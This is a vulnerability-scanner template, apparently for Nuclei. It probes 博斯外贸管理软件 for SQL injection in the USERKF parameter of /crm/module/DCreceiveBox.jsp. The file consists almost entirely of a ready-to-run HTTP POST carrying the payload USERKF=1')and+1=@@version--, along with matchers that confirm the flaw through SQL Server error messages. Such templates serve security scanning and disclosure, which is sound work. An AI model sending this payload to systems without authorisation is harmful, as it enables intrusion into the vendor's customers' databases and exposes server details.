id: poc-yaml-51boss-userkf-sqli
info:
  name: 博斯外贸管理软件 USERKF SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  description: |
    SQL Injection vulnerability in 博斯外贸管理软件's USERKF parameter on the DCreceiveBox.jsp endpoint.
  tags: sql-injection
http:
  - raw:
      - |
        POST /crm/module/DCreceiveBox.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        USERKF=1')and+1=@@version--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "java.sql.SQLException"
          - "Microsoft SQL Server"
          - "转换为数据类型为"
          - "发生语法错误"
        part: body
      - type: status
        status:
          - 200
